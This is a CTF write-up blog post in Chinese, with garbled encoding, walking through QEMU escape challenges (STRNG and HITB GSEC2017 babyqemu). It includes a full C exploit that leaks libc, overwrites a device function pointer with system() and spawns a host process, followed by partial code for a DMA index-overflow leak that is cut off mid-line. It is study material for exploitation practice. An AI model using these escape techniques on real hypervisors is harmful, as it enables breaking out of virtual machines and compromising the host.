<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011442913.png" alt="image-20230301144200823"></p>
<p><code>strng_mmio_write</code> å‡½æ•°æ˜¯ç”¨ <code>judge</code> åšäº†ä¸‰ä¸ªé€‰æ‹©ï¼Œå¦‚æœ <code>judge</code> ä¸º <code>0</code> å°±æ‰§è¡Œç»“æ„ä½“ä¸­çš„ <code>srand(val)</code> ï¼Œå¦‚æœä¸º <code>1</code> åˆ™æ‰§è¡Œ <code>rand()</code>ï¼Œå¦‚æœ <code>judge</code> ä¸º <code>3</code> å°±æ‰§è¡Œ  <code>rand_r(&amp;strng-&gt;regs[2])</code> ä»¥åŠ <code>regs[judge] = val</code> ï¼Œå¦åˆ™çš„è¯ <code>judge</code> å­˜åœ¨ä½†ä¸ä¸º <code>3</code> ï¼Œå°±æ‰§è¡Œ <code>regs[judge] = val</code>ã€‚è¿™é‡Œæ˜¯å­˜åœ¨ä¸€ä¸ª <code>regs</code> æ•°ç»„çš„ä»»æ„èµ‹å€¼çš„ï¼Œç´¢å¼•å’Œå‚æ•°éƒ½å¯æ§</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011451484.png" alt="image-20230301145112412" style="zoom:50%;" />



<p><code>strng_pmio_read</code> å‡½æ•°å­˜åœ¨ä¸€ä¸ªä»»æ„åœ°å€è¯»ï¼Œä»¥æ­¤æ¥æ³„éœ²ç»“æ„ä½“ä¸­ <code>regs</code> æ•°ç»„ä¸‹é¢çš„å‡½æ•°åœ°å€ã€‚æ­£å¸¸æ¥è¯´çš„è¯ <code>mmio_read</code> å‡½æ•°é‚£é‡Œçš„ä»»æ„åœ°å€è¯»ï¼Œä¹Ÿæ˜¯å¯ä»¥å®Œæˆçš„ï¼Œä½†æ˜¯å®è·µäº†ä¸€ä¸‹ï¼Œä¸€ç›´æ²¡åŠæ³•ç”¨ <code>mmio_read</code> æ³„éœ²å‡ºæ¥ <code>libc</code> æ•°æ®</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011534573.png" alt="image-20230301153424430" style="zoom:50%;" />



<p><code>strng_pmio_write</code> å‡½æ•°æœ€é‡è¦çš„æœ‰ä¸‰ä¸ªç‚¹ï¼Œç¬¬ä¸€æ˜¯ <code>opaque-&gt;addr</code> å¯æ§ï¼Œæ–¹ä¾¿å…¶ä»–å‡ ä¸ªå‡½æ•°ç”¨è¿™ä¸ª <code>opaque-&gt;addr</code> è¿›è¡Œåˆ©ç”¨ ï¼Œç¬¬äºŒæ˜¯ <code>v5</code> ä¸º <code>3</code> çš„è¯ï¼Œé‚£ä¹ˆæ‰§è¡Œ <code>rand_r</code> å‡½æ•°ï¼Œå¹¶ä¸”å‚æ•°ä¸º <code>opaque-&gt;regs[2]</code> ï¼Œ <code>v5</code> å­˜åœ¨ä¸”ä¸ä¸º <code>3</code> çš„è¯ï¼Œå¯ä»¥åˆ©ç”¨ <code>regs[v5]=val</code> å®ç°ä»»æ„åœ°å€å†™ï¼Œå¹¶ä¸”è¿™é‡Œçš„ç´¢å¼•å¯ä»¥æº¢å‡ºï¼ˆå¯èƒ½æ˜¯å› ä¸ºè¿™ä¸ª <code>v5</code> æ˜¯ <code>opaque-&gt;addr</code> æ¥ç¡®å®šçš„ï¼Ÿï¼‰</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011543310.png" alt="image-20230301154347221" style="zoom:50%;" />



<h4 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h4><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>strng_pmio_write</code> å‡½æ•°çš„ä»»æ„å†™ï¼Œæ¥ç¯¡æ”¹ <code>rand_r</code> è¿™ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œä»è€ŒåŠ«æŒç¨‹åºçš„æ‰§è¡Œæµï¼Œè€Œè¿™ä¸ªå‡½æ•°çš„å‚æ•°æ˜¯ <code>regs[2]</code> ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>strng_mmio_write</code> å‡½æ•°æ¥å‘ <code>regs[2]</code> ä»¥åŠä¹‹åçš„å†…å­˜å•å…ƒå†™å…¥æ•°æ®ï¼ˆä¹Ÿå°±æ˜¯å¸ƒç½®æˆ‘ä»¬çš„å‚æ•°ï¼‰ï¼Œæ³„éœ² <code>libc</code> åœ°å€çš„è¯ï¼Œå¯ä»¥ç”¨ <code>strng_pmio_read</code> å‡½æ•°æ¥è¿›è¡Œæ³„éœ²ã€‚</p>
<p>ç„¶åæˆ‘è¿™é‡Œé‡‡ç”¨çš„æ˜¯å¼¹ä¸€ä¸ªè®¡ç®—å™¨ï¼Œå…¶å­—ç¬¦ä¸²ä¸º <code>gnome-calculator</code>ï¼ˆæ‰§è¡Œ<code>/bin/sh</code> åº”è¯¥æ˜¯æ²¡æ³•äº¤äº’çš„ï¼Œå¯èƒ½åå¼¹ <code>shell</code> å¯ä»¥ï¼Ÿï¼‰</p>
<p>è¡¥å……ï¼š</p>
<p><code>PMIO_BASE</code> çš„åœ°å€æŸ¥çœ‹å‘½ä»¤æ˜¯ <code>lspci -v</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011630743.png" alt="image-20230301163055688"></p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMIO_BASE 0xc050</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">	perror(msg);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">unsigned</span> size)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *( (<span class="type">uint32_t</span> *)mmio_mem + addr );</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val )</span>&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span> *)(mmio_mem + addr)) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    outl(val,addr+PMIO_BASE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(PMIO_BASE+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000\:00/0000\:00\:03.0/resource0&quot;</span>,O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd==<span class="number">-1</span>)&#123;  perror(<span class="string">&quot;mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);  &#125;</span><br><span class="line"> </span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED,mmio_fd,<span class="number">0</span>);     <span class="comment">//mmap mmio space</span></span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == MAP_FAILED)&#123; perror(<span class="string">&quot;map mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span>(iopl(<span class="number">3</span>)!=<span class="number">0</span>)&#123;perror(<span class="string">&quot;iopl failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">   <span class="comment">//ioplå‡½æ•°æ¥æå‡IOçš„ç­‰çº§ï¼Œå¦åˆ™è¿™ä¸ªpmioä½¿ç”¨çš„æ˜¯æœ‰é—®é¢˜çš„</span></span><br><span class="line">   </span><br><span class="line">    <span class="comment">//----------Control parameters-----------</span></span><br><span class="line">    mmio_write(<span class="number">2</span>,<span class="number">0x41414141</span>);</span><br><span class="line">    mmio_write(<span class="number">3</span>,<span class="number">0x41414141</span>);</span><br><span class="line">    mmio_write(<span class="number">4</span>,<span class="number">0x3b414141</span>);</span><br><span class="line">    mmio_write(<span class="number">5</span>,<span class="number">0x6d6f6e67</span>);   <span class="comment">// regs[2]</span></span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">0x61632d65</span>);  <span class="comment">// regs[3]</span></span><br><span class="line">    mmio_write(<span class="number">7</span>,<span class="number">0x6c75636c</span>);  <span class="comment">// regs[4]</span></span><br><span class="line">    mmio_write(<span class="number">8</span>,<span class="number">0x726f7461</span>);  <span class="comment">// regs[5]</span></span><br><span class="line">   <span class="comment">//-----------leak libc address----------</span></span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">0</span>,<span class="number">0x118</span>);<span class="comment">//set opaque-&gt;addr</span></span><br><span class="line">    <span class="type">uint64_t</span> high_addr=pmio_read(<span class="number">4</span>);</span><br><span class="line">    pmio_write(<span class="number">0</span>,<span class="number">0x114</span>);</span><br><span class="line">    <span class="type">uint64_t</span> low_addr=pmio_read(<span class="number">4</span>);</span><br><span class="line">    <span class="type">uint64_t</span> rand_r_addr=low_addr+(high_addr&lt;&lt;<span class="number">32</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;low addr @ %llx\n&quot;</span>,low_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;high addr @ %llx\n&quot;</span>,high_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand_r function address @ %llx\n&quot;</span>,rand_r_addr);</span><br><span class="line">    <span class="type">uint64_t</span> system_addr=rand_r_addr+<span class="number">0xb080</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system function address @ %llx\n&quot;</span>,system_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//----------write system address---------</span></span><br><span class="line">    pmio_write(<span class="number">0</span>,<span class="number">0x114</span>);</span><br><span class="line">    pmio_write(<span class="number">4</span>,system_addr&amp;<span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//----------tigger system----------------</span></span><br><span class="line">    pmio_write(<span class="number">0</span>,<span class="number">0xc</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;test\n&quot;</span>);</span><br><span class="line">    pmio_write(<span class="number">4</span>,<span class="number">0x0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011626104.png" alt="image-20230301162602101"></p>
<h4 id="çŒœæµ‹"><a href="#çŒœæµ‹" class="headerlink" title="çŒœæµ‹"></a>çŒœæµ‹</h4><p>å› ä¸ºä¸Šé¢å‘ç° <code>mmio_read</code> å’Œ <code>mmio_write</code> å‡½æ•°éƒ½æ— æ³•ç´¢å¼•æº¢å‡ºï¼Œå°½ç®¡çœ‹èµ·æ¥ <code>qemu-system-x86_64</code> ç¨‹åºä¸­æ²¡æœ‰åšä»»ä½•çš„æ£€æŸ¥ï¼Œä½†å°è¯•äº†ä¸€ä¸‹ï¼Œæ•°ç»„è¶Šç•Œè®¿é—®çš„è¯ç¡®å®æ˜¯æœ‰ç‚¹é—®é¢˜ã€‚ç„¶åçœ‹äº†ä¸€ä¸ªå¸ˆå‚…çš„è§£é‡Šï¼Œå¤§æ¦‚æ˜¯ä¸‹é¢çš„è¿™ä¸ªæ„æ€</p>
<p><code>MMIO</code> å’Œ <code>PMIO</code> çš„ç©ºé—´å¤§å°æ˜¯ç”± <code>pci_xxx_realize</code> å‡½æ•°ä¸­æ³¨å†Œçš„ã€‚</p>
<p>æœ¬é¢˜è¿™é‡Œæ ‡æ˜äº† <code>MMIO</code> çš„å¤§å°æ˜¯ <code>0x100</code>  </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302281045546.png" alt="image-20230228104514364"></p>
<p>æœ¬åœ°çš„ <code>regs</code> æ•°ç»„å¤§å°å°±æ˜¯ <code>0x100</code> ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯æ— æ³•é€šè¿‡æ•°ç»„æº¢å‡ºè¦†ç›–åˆ°ä¸‹é¢çš„å‡½æ•°æŒ‡é’ˆçš„ã€‚å› ä¸º <code>pci</code> è®¾å¤‡å†…éƒ¨ä¼šè¿›ç¨‹æ£€æŸ¥</p>
<h3 id="HITB-GSEC2017-BABYQEMU"><a href="#HITB-GSEC2017-BABYQEMU" class="headerlink" title="[HITB GSEC2017]BABYQEMU"></a>[HITB GSEC2017]BABYQEMU</h3><p>é™„ä»¶åœ¨ <code>buu</code> ä¸Šå¯ä»¥æœåˆ°</p>
<p>é€šè¿‡åˆ†æ <code>launch.sh</code> æ–‡ä»¶å¾—çŸ¥è¿™æ¬¡çš„è®¾å¤‡å«åš <code>hitb</code> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#! /bin/sh</span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-kernel ./vmlinuz-4.8.0-52-generic \</span><br><span class="line">-append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-m 64M --nographic  -L ./dependency/usr/local/share/qemu \</span><br><span class="line">-L pc-bios \</span><br><span class="line">-device hitb,id=vda</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>æˆ‘ç”¨çš„ <code>ubuntu18.04</code> ï¼Œç„¶åè¿è¡Œ <code>launch.sh</code> çš„æ—¶å€™æœ‰å¦‚ä¸‹æŠ¥é”™</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041237815.png" alt="image-20230304123706649"></p>
<p>è§£å†³æ–¹æ³•ï¼šæ‰§è¡Œ <code>sudo apt install libcurl3</code></p>
<p>ç„¶åå‘ç°ç™»å½•ä¸Šå»çš„æ—¶å€™è¯¢é—®ç”¨æˆ·åå’Œå¯†ç </p>
<p>æˆ‘ä»¬ç”¨å¦‚ä¸‹å‘½ä»¤ï¼Œæ¥å°† <code>rootfs.cpio</code> æ–‡ä»¶è§£å‹ç¼©ï¼Œç„¶åæˆ‘ä»¬å» <code>etc</code> ç›®å½•ä¸‹ï¼ŒæŸ¥çœ‹ <code>shadow</code> æ–‡ä»¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir tmp</span><br><span class="line">cpio -idv &lt; /home/zikh/Desktop/pwn_qemu/rootfs.cpio</span><br><span class="line">cd etc</span><br><span class="line">cat shadow</span><br></pre></td></tr></table></figure>



<p>å‘ç°å¦‚æœç”¨æˆ·åä¸º <code>root</code> çš„è¯ï¼Œåé¢çš„å¯†ç ä¸ºç©ºï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303021733038.png" alt="image-20230302173323824"></p>
<p>å› æ­¤åœ¨ç™»å½•çš„æ—¶å€™ï¼Œç”¨æˆ·åè¾“å…¥ä¸º <code>root</code> å³å¯ç™»å½•æˆåŠŸï¼ˆå¦‚ä¸‹ï¼‰</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041306416.png" alt="image-20230304130630554" style="zoom:50%;" />



<h4 id="ä»£ç é€†å‘-1"><a href="#ä»£ç é€†å‘-1" class="headerlink" title="ä»£ç é€†å‘"></a>ä»£ç é€†å‘</h4><p>é¦–å…ˆåœ¨ <code>hitb_class_init</code> å‡½æ•°ä¸­ç¡®å®šè®¾å¤‡å·</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041308293.png" alt="image-20230304130826234" style="zoom:50%;" />

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041309270.png" alt="image-20230304130955192"></p>
<p>ç»“åˆä¸Šé¢ä¸¤ä¸ªå›¾ç‰‡å¯ä»¥åˆ†æå‡º <code>00:04:0</code> æ˜¯ <code>hitb</code> çš„è®¾å¤‡å·ã€‚</p>
<p>æœ¬é¢˜æ²¡æœ‰ <code>pmio</code> çš„å‡½æ•°ï¼Œä½†æ˜¯æœ‰ <code>mmio</code> çš„ä¸¤ä¸ªå‡½æ•°ä»¥åŠ <code>dma_timer</code> ã€‚</p>
<p>ç®€å•åˆ†æä¸‹è¿™ä¸‰ä¸ªå‡½æ•°</p>
<p>é¦–å…ˆçœ‹ <code>hitb_mmio_read</code> å‡½æ•°ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041321559.png" alt="image-20230304132100421"></p>
<p>è¿™ä¸ªæ¯”è¾ƒæ˜æ˜¾ï¼Œå‡½æ•°å°±æ˜¯è®©ä½ é€‰æ‹©ä¸åŒçš„ <code>addr</code> ç„¶åç”¨ <code>return</code> è¿”å›ç»“æ„ä½“çš„ä¸åŒå­—æ®µã€‚æƒ³æ˜¾ç¤ºç»“æ„ä½“çš„å­—æ®µçš„è¯ï¼Œéœ€è¦å°† <code>opaque</code> çš„ç±»å‹æ”¹ä¸º <code>HitbState *</code> ï¼ˆè¿™æ˜¯ <code>qemu</code> é€ƒé€¸çš„ç¬¬ä¸‰é“é¢˜äº†ï¼Œç»™æˆ‘çš„æ„Ÿè§‰æ˜¯é€šå¸¸æ¼æ´éƒ½å‘ç”Ÿåœ¨æ•°ç»„ç´¢å¼•è¶Šç•Œä¸Šï¼‰ï¼Œè¿™ä¸ª <code>mmio_read</code> å‡½æ•°å¹¶æ²¡æœ‰ç”¨åˆ°ç´¢å¼•æ¥è®¿é—®æˆå‘˜ï¼Œæ‰€ä»¥è¿™é‡Œç®€å•çœ‹ä¸€ä¸‹å‘ç°æ˜¯æ²¡ä»€ä¹ˆé—®é¢˜çš„ã€‚</p>
<p>å…¶æ¬¡æ˜¯ <code>hitb_mmio_write</code> å‡½æ•°ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œè¿™é‡Œå°±æ˜¯è®©æ ¹æ®ä¸åŒçš„ <code>addr</code> ç„¶åç»™ç»“æ„ä½“ä¸åŒçš„å­—æ®µè¿›è¡Œèµ‹å€¼ï¼Œå…¶å€¼ä¸º <code>val</code>ã€‚è¿™é‡Œä¹Ÿæ²¡æœ‰é€šè¿‡æ•°ç»„çš„ç´¢å¼•æ¥è®¿é—®æˆå‘˜ï¼Œçœ‹èµ·æ¥ä¹Ÿæ˜¯å®‰å…¨çš„ã€‚</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041325990.png" alt="image-20230304132554889" style="zoom: 67%;" />



<p>ä¸è¿‡è¿™é‡Œè¦å…³æ³¨ä¸€ä¸‹ <code>timer_mod</code> å‡½æ•° </p>
<p>è¯¥å‡½æ•°çš„å¤§è‡´æ„æ€æ˜¯è¯´å½“è¶…è¿‡ <code>expire_time</code> è¿™ä¸ªæ—¶é—´æ—¶ä¼šè§¦å‘å®šæ—¶å™¨ä¸­æ–­ï¼Œå…¶å¤„ç†å‡½æ•°æ˜¯ <code>ts</code> ç»“æ„ä½“ä¸­çš„ <code>cb</code> å‚æ•°æŒ‡å®šçš„å‡½æ•°ï¼Œåœ¨ <code>pci_hitb_realize</code> å‡½æ•°ä¸­çš„ <code>timer_init_tl</code> å‡½æ•°é‡Œé¢å°† <code>hitb_dma_timer</code> å‡½æ•°èµ‹å€¼ç»™äº† <code>ts</code> ç»“æ„ä½“ä¸­çš„ <code>cb</code> ï¼ˆ <code>call back</code> ï¼‰ã€‚å› æ­¤æˆ‘ä»¬æ·»åŠ  <code>sleep</code> å‡½æ•°ï¼Œè®©å…¶è¶…è¿‡ <code>expire_time</code> ï¼Œä»è€Œè°ƒç”¨ <code>hitb_dma_timer</code> å‡½æ•°</p>
<p>æœ€åæ¥çœ‹ä¸‹ <code>hitb_dma_timer</code> å‡½æ•°</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041434536.png" alt="image-20230304143404417"></p>
<p>è¿™é‡Œå°±æœ‰æˆ‘ä»¬å¿ƒå¿ƒå¿µå¿µçš„æ•°ç»„ç´¢å¼•äº†ï¼Œè€Œä¸”æˆ‘ä»¬èƒ½å¤Ÿå‘ç°è¿™é‡Œçš„ç´¢å¼• <code>v2</code> æ˜¯æ²¡æœ‰åšä»»ä½•æ£€æŸ¥çš„ï¼Œå¹¶ä¸”å®ƒæ˜¯è¢« <code>opaque-&gt;dma.src</code> æ‰€æ§åˆ¶ï¼Œè¿™ä¸ª <code>dma.src</code> æ˜¯åœ¨ <code>hitb_mmio_write</code> å‡½æ•°å¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶çš„ï¼Œæ‰€ä»¥è¿™é‡Œ <code>dma_buf[v2]</code> æ˜¯å­˜åœ¨ç´¢å¼•æº¢å‡ºçš„ã€‚</p>
<h4 id="åˆ©ç”¨æ€è·¯-1"><a href="#åˆ©ç”¨æ€è·¯-1" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h4><p>é‡ç‚¹çœ‹ä¸‹ <code>cpu_physical_memory_rw</code> å‡½æ•°</p>
<blockquote>
<p><code>void cpu_physical_memory_rw(hwaddr addr, uint8_t *buf,int len, int is_write)</code> å‡½æ•°æ˜¯ <code>QEMU</code> è™šæ‹Ÿæœºç›‘è§†å™¨ä¸­ä¸€ä¸ªç”¨äºè¯»å†™ç‰©ç†å†…å­˜çš„å‡½æ•°ã€‚è¯¥å‡½æ•°çš„ä½œç”¨æ˜¯åœ¨è™šæ‹Ÿæœºä¸­è¯»å†™æŒ‡å®šåœ°å€çš„ç‰©ç†å†…å­˜ï¼Œå¹¶å°†è¯»å–æˆ–å†™å…¥çš„æ•°æ®å­˜å‚¨åœ¨ç»™å®šçš„ç¼“å†²åŒºä¸­ã€‚å®ƒçš„å‚æ•°å¦‚ä¸‹ï¼š</p>
<ul>
<li><code>hwaddr addr</code>ï¼šä¸€ä¸ªè¡¨ç¤ºç‰©ç†å†…å­˜åœ°å€çš„æ— ç¬¦å·æ•´æ•°ç±»å‹ã€‚éœ€è¦è¯»å†™çš„ç‰©ç†åœ°å€ã€‚</li>
<li><code>uint8_t *buf</code>ï¼šä¸€ä¸ªæŒ‡å‘è¦è¯»å–æˆ–å†™å…¥æ•°æ®çš„ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚æ•°æ®å­˜å‚¨åœ¨è¿™é‡Œã€‚</li>
<li><code>int len</code>ï¼šä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºè¦è¯»å–æˆ–å†™å…¥æ•°æ®çš„é•¿åº¦ã€‚</li>
<li><code>int is_write</code>ï¼šä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ“ä½œæ˜¯è¯»å–ï¼ˆ0ï¼‰è¿˜æ˜¯å†™å…¥ï¼ˆé0ï¼‰æ“ä½œã€‚</li>
</ul>
</blockquote>
<p>ä»¥è¿™è¡Œä»£ç ä¸ºä¾‹ <code>cpu_physical_memory_rw(opaque-&gt;dma.dst, cnt_low, opaque-&gt;dma.cnt, 1);</code>  ï¼Œå…¶ä½œç”¨æ˜¯å°† <code>cnt_low</code> å†™å…¥ç‰©ç†å†…å­˜ <code>opaque-&gt;dma.dst</code> çš„ä½ç½®ï¼ˆ <code>qemu</code> ä¸­çš„ç‰©ç†å†…å­˜ ï¼‰,å†™å…¥çš„å­—èŠ‚æ•°ä¸º <code>opaque-&gt;dma.cnt</code> ã€‚</p>
<p><code>cnt_low</code> æ˜¯ç”± <code>(uint8_t *)&amp;opaque-&gt;dma_buf[v2]</code> æ‰€èµ‹å€¼çš„ï¼Œæˆ‘ä»¬ä¸Šé¢æåˆ°äº† <code>dma_buf</code> æ•°ç»„å­˜åœ¨ç´¢å¼•æº¢å‡ºï¼Œç°åœ¨æ¥çœ‹ä¸‹æ¯” <code>dma_buf</code> ä½çš„ä½ç½®æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ç”¨çš„ï¼ˆå¦‚ä¸‹ï¼‰</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820030.png" alt="image-20230304162135975" style="zoom: 50%;" />

<p>å‘ç°äº† <code>dma_buf</code> ä¸‹é¢ç´§æŒ¨ç€çš„å°±æ˜¯ <code>enc</code> è¿™ä¸ªå‡½æ•°åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è®© <code>v2</code> æº¢å‡ºï¼Œè®©å…¶ <code>dma_buf[v2]</code> æŒ‡å‘ <code>enc</code> ï¼Œæ¥ç€æ‰§è¡Œ <code>cpu_physical_memory_rw</code> å‡½æ•°ï¼Œè¿™æ · <code>enc</code> å‡½æ•°çš„åœ°å€å°±ä¼šè¢«å†™å…¥åˆ° <code>opaque-&gt;dma.dst</code> æŒ‡å‘çš„å†…å­˜ï¼Œä¹Ÿå°±æ˜¯è¯´åªè¦è®© <code>opaque-&gt;dma.dst</code> ä¸ºæˆ‘ä»¬èƒ½å¤Ÿè®¿é—®çš„ç‰©ç†å†…å­˜ï¼Œæ‰§è¡Œå®Œè¿™ä¸ªå‡½æ•°åï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ‰“å°è¿™ä¸ªç‰©ç†å†…å­˜æ‰€å¯¹åº”çš„å˜é‡å°±èƒ½è·å–ç¨‹åºåŸºåœ°å€</p>
<p>æœç´¢ä¸€ä¸‹å‘ç°ï¼Œæœ¬é¢˜æ˜¯æœ‰ <code>system</code> å‡½æ•°çš„ï¼Œæ‰€ä»¥åªè¦æ‹¿åˆ°ç¨‹åºé‡Œå‡½æ•°çš„åœ°å€ï¼Œç”¨å›ºå®šåç§»å°±å¯ä»¥å¾—åˆ° <code>system</code> å‡½æ•°çš„åœ°å€ã€‚</p>
<p>**æ³¨æ„ï¼š<code>cpu_physical_memory_rw</code> å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦çš„æ˜¯ç‰©ç†åœ°å€ï¼Œæ‰€ä»¥éœ€è¦å°† <code>qemu</code> ä¸­çš„è™šæ‹Ÿå†…å­˜è½¬æ¢ä¸ºç‰©ç†åœ°å€ï¼Œå…·ä½“è½¬æ¢çš„æ–¹æ³•å¯ä»¥å‚è€ƒæ–‡æœ«çš„ <code>qemu</code> ä¸­çš„è™šæ‹Ÿå†…å­˜ä¸ç‰©ç†å†…å­˜éƒ¨åˆ† ** </p>
<p>è¿™é‡Œçš„ <code>exp</code> å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint64_t</span> enc_addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enc_addr @ %llx\n&quot;</span>,&amp;enc_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enc_physics_addr @ %llx\n&quot;</span>,gva_to_gpa(&amp;enc_addr));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enc_value @ %llx\n&quot;</span>,enc_addr);</span><br><span class="line">mmio_write(<span class="number">0x80</span>,<span class="number">0x41000</span>);<span class="comment">//set dma.src</span></span><br><span class="line">mmio_write(<span class="number">0x88</span>,gva_to_gpa(&amp;enc_addr));<span class="comment">//set dma.dst</span></span><br><span class="line">mmio_write(<span 